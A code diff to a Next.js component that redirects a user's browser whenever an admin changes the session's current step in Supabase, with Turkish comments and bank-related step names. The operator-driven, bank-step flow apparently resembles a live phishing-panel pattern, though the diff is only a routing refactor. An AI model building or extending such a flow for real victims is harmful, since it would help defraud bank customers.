@@ -5,19 +5,24 @@ import { usePathname, useRouter } from "next/navigation";
 import type { SessionStatus, SessionStep } from "@/types/session";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { pathToStep, stepToPath } from "@/lib/session-routes";
-import { persistActiveSession } from "@/lib/session-id-client";
+import {
+  getPreferredRouteSessionId,
+  persistActiveSession,
+} from "@/lib/session-id-client";
 
 type Props = {
   sessionId: string;
+  routeSessionId?: string;
 };
 
-export function SessionRealtimeGate({ sessionId }: Props) {
+export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
   const router = useRouter();
   const pathname = usePathname();
+  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
 
   /* Presence: demo ortamında admin için online göstergesi */
   useEffect(() => {
-    persistActiveSession(sessionId);
+    persistActiveSession(sessionId, effectiveRouteSessionId);
     const supabase = createBrowserSupabaseClient();
     if (!supabase) return;
 
@@ -51,7 +56,7 @@ export function SessionRealtimeGate({ sessionId }: Props) {
       document.removeEventListener("visibilitychange", onVisibility);
       markOffline();
     };
-  }, [sessionId]);
+  }, [effectiveRouteSessionId, sessionId]);
 
   /* İlk yüklemede sunucu adımı ile senkron */
   useEffect(() => {
@@ -79,13 +84,13 @@ export function SessionRealtimeGate({ sessionId }: Props) {
       if (local === "banken" && serverStep === "bank") return;
       
       if (local && serverStep !== local) {
-        window.location.href = stepToPath(serverStep, sessionId);
+        window.location.href = stepToPath(serverStep, sessionId, effectiveRouteSessionId);
       }
     })();
     return () => {
       cancelled = true;
     };
-  }, [sessionId, pathname, router]);
+  }, [effectiveRouteSessionId, sessionId, pathname, router]);
 
   /* Realtime: admin current_step değişince anında yönlendir */
   useEffect(() => {
@@ -118,7 +123,11 @@ export function SessionRealtimeGate({ sessionId }: Props) {
           if (local === "banken" && next.current_step === "bank") return;
 
           if (local && next.current_step !== local) {
-            window.location.href = stepToPath(next.current_step, sessionId);
+            window.location.href = stepToPath(
+              next.current_step,
+              sessionId,
+              effectiveRouteSessionId,
+            );
           }
         },
       )
@@ -127,7 +136,7 @@ export function SessionRealtimeGate({ sessionId }: Props) {
     return () => {
       void supabase.removeChannel(channel);
     };
-  }, [sessionId, pathname, router]);
+  }, [effectiveRouteSessionId, sessionId, pathname, router]);
 
   return null;
 }
